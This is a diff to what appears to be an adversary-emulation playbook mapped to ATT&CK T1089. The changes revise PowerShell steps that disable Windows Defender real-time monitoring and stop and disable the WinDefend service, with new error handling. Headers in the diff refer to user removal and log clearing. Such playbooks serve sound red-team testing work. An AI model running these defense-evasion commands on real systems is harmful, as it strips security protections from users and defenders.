@@ -115,11 +115,24 @@ Write-Host -ForegroundColor Green "'notahacker' removed from userlist."
 ```PowerShell
 Write-Host -ForegroundColor Cyan "Initiating Defense Evasion - T1089 - Disabling Security Tools"
 Write-Host "Disabling Defender..."
-$cmd = @"
-Set-MpPreference -DisableRealtimeMonitoring $true
-Start-Sleep -Milliseconds $n
-"@
-powershell.exe -nop -command $cmd
+$cmd = "Set-MpPreference -DisableRealtimeMonitoring `$true; Start-Sleep -Milliseconds 1000"
+$p = Start-Process -FilePath "powershell.exe" `
+    -ArgumentList "-nop", "-command", "`$ErrorActionPreference = 'Stop'; $cmd" `
+    -RedirectStandardError "error.txt" `
+    -RedirectStandardOutput "output.txt" `
+    -NoNewWindow `
+    -PassThru
+$p.WaitForExit()
+$errorOutput = Get-Content -Path "error.txt" -Raw
+Remove-Item "error.txt", "output.txt" -Force
+if ($errorOutput -match "Invalid class") {
+    Write-Host -ForegroundColor Yellow "Defender is not available on this system. Skipping..."
+} elseif ($errorOutput) {
+    Write-Host -ForegroundColor Red "An error occurred while trying to disable Defender:"
+    Write-Host -ForegroundColor Red $errorOutput
+} else {
+    Write-Host -ForegroundColor Green "Realtime Monitoring successfully disabled."
+}
 ```
 
 ### 4. Disabling Security Tools - Service Control Manager
@@ -131,13 +144,38 @@ Use the Service Control Manager (sc.exe) to perform a **Disable Security Tools**
 ```PowerShell
 Write-Host -ForegroundColor Cyan "Initiating Defense Evasion - T1089 - Disabling Security Tools"
 Write-Host "Disabling Defender..."
+
 $cmd = @"
 sc.exe config WinDefend start= disabled
 sc.exe stop WinDefend
-Start-Sleep -Milliseconds $n
+Start-Sleep -Milliseconds 1000
 "@
-powershell.exe -nop -command $cmd
-Write-Host -ForegroundColor Red "Windows Defender Disabled"
+
+$pinfo = New-Object System.Diagnostics.ProcessStartInfo
+$pinfo.FileName = "powershell.exe"
+$pinfo.Arguments = "-nop -command `$ErrorActionPreference='Stop'; $cmd"
+$pinfo.RedirectStandardError = $true
+$pinfo.RedirectStandardOutput = $true
+$pinfo.UseShellExecute = $false
+$pinfo.CreateNoWindow = $true
+
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo = $pinfo
+$process.Start() | Out-Null
+
+$stdout = $process.StandardOutput.ReadToEnd()
+$stderr = $process.StandardError.ReadToEnd()
+$process.WaitForExit()
+
+if ($stdout -match "OpenService FAILED 1060") {
+    Write-Host -ForegroundColor Yellow "Defender service is not available on this system. Skipping..."
+} elseif ($stderr) {
+    Write-Host -ForegroundColor Red "An unexpected error occurred:"
+    Write-Host -ForegroundColor Red $stderr
+} else {
+    Write-Host -ForegroundColor Green "Windows Defender service successfully disabled."
+}
+
 ```
 
 ### 5. Removing Evidence of Activity - wevtutil.exe clear logs
